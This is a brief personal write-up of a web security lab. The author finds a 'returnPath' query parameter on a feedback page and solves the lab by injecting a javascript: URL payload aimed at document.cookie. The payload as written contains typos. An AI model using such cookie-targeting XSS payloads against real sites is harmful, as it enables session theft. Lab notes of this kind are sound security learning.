![[Pasted image 20261006081755.png]]

# Steps
## Step 1
I first access the lab and and navigate to the submit feedback functionality 
![[Pasted image 20261006081944.png]]
# Step 2
I see that the URL of the lab for `Submit feedback` page is have query parameter called `returnPath` so i tired to inset an xss attack payload:
```
javascript:aler(documet.cookie)
```
then boom the lab is solved
![[Pasted image 20261006082341.png]]